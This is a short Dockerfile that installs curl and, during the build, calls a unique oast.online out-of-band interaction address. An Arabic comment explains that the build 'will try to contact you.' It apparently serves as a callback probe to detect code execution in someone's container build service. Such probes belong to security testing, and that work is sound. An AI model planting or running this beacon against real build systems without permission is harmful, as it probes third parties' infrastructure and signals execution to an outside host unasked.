FROM alpine:latest 
# أول ما يبدأ يبني، هيحاول يكلمك 
RUN apk add --no-cache curl && curl http://d52f32g3t4gnf3lq0g60xzzuc13obr7bm.oast.online/docker_build
